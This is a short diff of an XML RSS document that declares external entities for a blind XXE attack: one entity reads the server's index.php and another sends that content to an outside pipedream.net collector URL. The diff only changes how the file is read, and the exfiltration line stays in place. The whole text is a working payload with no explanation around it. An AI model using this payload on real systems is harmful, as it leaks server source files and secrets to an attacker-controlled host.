@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+  <!ENTITY xxe SYSTEM "file://index.php">
   <!ENTITY blind SYSTEM "https://eodoqfgdto5tcqx.m.pipedream.net/?cookie=&xxe;">
 ]>
 <rss version="2.0">
